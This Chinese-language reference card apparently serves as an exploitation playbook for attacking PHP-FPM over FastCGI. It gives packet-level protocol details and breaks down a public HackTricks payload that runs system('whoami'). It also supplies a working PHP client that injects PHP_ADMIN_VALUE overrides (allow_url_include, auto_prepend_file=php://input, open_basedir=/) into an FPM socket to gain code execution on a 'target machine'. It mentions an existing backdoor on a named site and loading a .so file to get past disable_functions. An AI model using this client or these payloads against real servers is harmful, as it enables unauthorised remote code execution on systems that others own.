# FastCGI 协议细节与源码依据（本卡的「硬事实」清单）

所有结论都核过源码/实测，不是转述。任务里若出现「FPM 不收我的包」先看这里。

## 1. 记录头（8 字节，大端）

```
version(1) | type(1) | requestId(2) | contentLength(2) | paddingLength(1) | reserved(1)
```
- version 必须 = 1
- contentLength 是**不含 padding** 的内容长度；记录总长 = 8 + contentLength + paddingLength
- 常见 type: 1=BEGIN_REQUEST 2=ABORT_REQUEST 3=END_REQUEST 4=PARAMS 5=STDIN 6=STDOUT 7=STDERR

## 2. FCGI_BEGIN_REQUEST：body 必须 8 字节（**本卡最常踩的坑**）

字段顺序（php-src / nginx 一致，**role 占 2 字节**）:

| 偏移 | 长度 | 字段 |
|---|---|---|
| 0 | 1 | roleB1 |
| 1 | 1 | roleB0 |
| 2 | 1 | flags（1 = FCGI_KEEP_CONN） |
| 3 | 5 | reserved[5] |

- role = `(roleB1 << 8) | roleB0`；**1 = FCGI_RESPONDER**（2=AUTHORIZER, 3=FILTER，FPM 未实现 → 直接断）
- 源码依据：php-src `main/fastcgi.c` 里 `fcgi_begin_request` 结构体即 `roleB1, roleB0, flags, reserved[5]`，
  且判定条件带 `len == sizeof(fcgi_begin_request)`（==8）
- nginx 依据：`ngx_http_module.../ngx_http_fastcgi_begin_request_t` = `role_hi, role_lo, flags, reserved[5]`，
  nginx 发出的固定头就是 `01 01 00 01 00 08 00 00` + `00 01 00 00 00 00 00 00`

**PHP 侧两种写法对比**:

```php
pack('nCx5', 1, 0)              // = 00 01 00 00 00 00 00 00  8 字节  ✅
pack('nC5', 1, 0, 0, 0, 0, 0, 0) // = 00 01 00 00 00 00 00      7 字节  ❌ 多出的参数被忽略
```
7 字节时 FPM 的表现：`len != sizeof(...)` → 不进入 BEGIN 分支 → 后续 PARAMS/STDIN 被当作错误记录 →
客户端侧典型现象是 **`rawlen=0` / 读不到任何响应**。
> 实战出处：phpv4.88demo.cn 站上那个别人留下的后门 `_or1e45ffb8.php` 就是 7 字节写法，它的 `fcgi` 动作一直失败。
> 本卡的自测脚本 `scripts/test_fcgi.py` 有 7 字节 / 8 字节的反例对拍。

## 3. FCGI_PARAMS 的 name/value 长度编码

```
nameLen(1..4) name valueLen(1..4) value
```
- 若长度 < 0x80：1 字节
- 否则：4 字节大端，且**最高位置 1**：`len | 0x80000000`
- 参数流以**空 PARAMS 记录**结束（type=4, contentLength=0）；不要只依赖 KEEP_CONN
- 单条记录最大 65535；nginx 会按约 4KB 分片 → 客户端分片发送（本卡脚本按 4000 分片）兼容性最好

## 4. STDIN / 响应读取

- STDIN 内容按需分片，最后必须补一条**空 STDIN 记录**表示请求体结束
- 响应：循环读 8 字节头 → 取 contentLength → 读到 STDOUT(6)/STDERR(7) → 直到 END_REQUEST(3)
- END_REQUEST body 8 字节 = appStatus(4) + protocolStatus(1) + reserved(3)；protocolStatus 非 0 表示 FPM 侧出错

## 5. FPM 侧的请求级 ini 覆盖（决定 L1/L2/L3 能不能成立）

- 请求里带 `PHP_VALUE` / `PHP_ADMIN_VALUE` 作为普通 PARAMS 传递，FPM 会当作该次请求的 ini 覆盖应用
- `PHP_ADMIN_VALUE` 能力更强（对 PHP_INI_SYSTEM / PHP_INI_PERDIR 也生效）→ **`allow_url_include`、`auto_prepend_file` 必须走它**
- `open_basedir` 是运行时检查 → 请求级覆盖有效（报告里实测 `open_basedir=/` 生效）
- `disable_functions` 只在**主 php.ini** 生效且函数表在 worker 启动时已裁剪 → 请求级置空**无效**
- `SCRIPT_FILENAME` 必须磁盘真实存在且后缀在 `security.limit_extensions` 白名单（默认 `.php`），
  否则 STDERR: `Access to the script '...' has been denied (see security.limit_extensions)`；
  `.php` 后缀对上了但文件不存在 → `Primary script unknown`

## 6. 已知公开 payload 的结构（HackTricks 那个 base64 的逐包拆解）

对公开流传的那段 base64 解码后逐记录解析，结构为：

```
BEGIN_REQUEST  len=8   body=00 01 00 00 00 00 00 00         # role=1, flags=0
PARAMS         len=260 body= SERVER_SOFTWARE/REMOTE_ADDR/SERVER_PROTOCOL/
                              CONTENT_LENGTH/REQUEST_METHOD/PHP_VALUE/SCRIPT_FILENAME/DOCUMENT_ROOT
                              （PHP_VALUE 里是 allow_url_include = On / disable_functions = / auto_prepend_file = php://input）
PARAMS         len=0
STDIN          len=76  body= <?php system('whoami > /tmp/whoami.txt');die('...');?>
STDIN          len=0
```
即：**它也是靠 L2（`auto_prepend_file=php://input` + `allow_url_include=On`）拿代码执行**，
而不是靠 `disable_functions=`（那行置空是无效遗留写法，别照抄它的期望）。
把 `system` 换成受 `disable_functions` 限制弱的 `file_*`/`curl_*`，或在 L3 挂 `.so` 之后再用 `system`。

## 7. 最小可用 PHP 客户端（目标机只有 PHP 时用，比 python 脚本更容易落地）

```php
function nv($n,$v){ $e=fn($s)=>strlen($s)<128?chr(strlen($s)).$s:pack('N',strlen($s)|0x80000000).$s; return $e($n).$e($v); }
function r($t,$c=''){ $pad=(8-strlen($c)%8)%8; return pack('CCnnCC',1,$t,1,strlen($c),$pad,0).$c.str_repeat("\0",$pad); }
$params = nv('SCRIPT_FILENAME',$sfn).nv('REQUEST_METHOD','POST')
        .nv('CONTENT_LENGTH',strlen($body))
        .nv('PHP_ADMIN_VALUE',"open_basedir=/\nallow_url_include=On\nauto_prepend_file=php://input\n");
$pkt = r(1, pack('CCC5', 0,1,0,0,0,0,0,0))   // 注意 pack('CCC5',...) 里 8 个参数 => 3+5 = 8 字节 ✅
     . r(4,$params).r(4).r(5,$body).r(5);
$s = stream_socket_client('unix:///tmp/php-cgi-74.sock', $e, $m, 5);
fwrite($s,$pkt); echo stream_get_contents($s);
```
> `pack('CCC5', 0,1,0,0,0,0,0,0)`：`C C` 各 1 字节 + `C5` 5 字节 = 8 字节，等价于 `pack('nCx5',1,0)`。
> 写这里是为了强调：**参数个数要对上格式串**，少一个就退回 7 字节的老坑。

## 8. 自测（不接触目标）

```bash
python3 scripts/test_fcgi.py      # 起 mock FPM（scripts/mock_fpm.py）跑 8 项：probe/read/exec/ext/
                                  # status/limit_extensions 拒绝/7-8 字节反例/db 下发
```
mock 按上面的源码语义实现（BEGIN body 长度校验、role 校验、limit_extensions、PHP_ADMIN_VALUE 生效判定），
所以它绿了就说明**包结构和参数语义是对的**，剩下只是目标侧路径/权限适配。
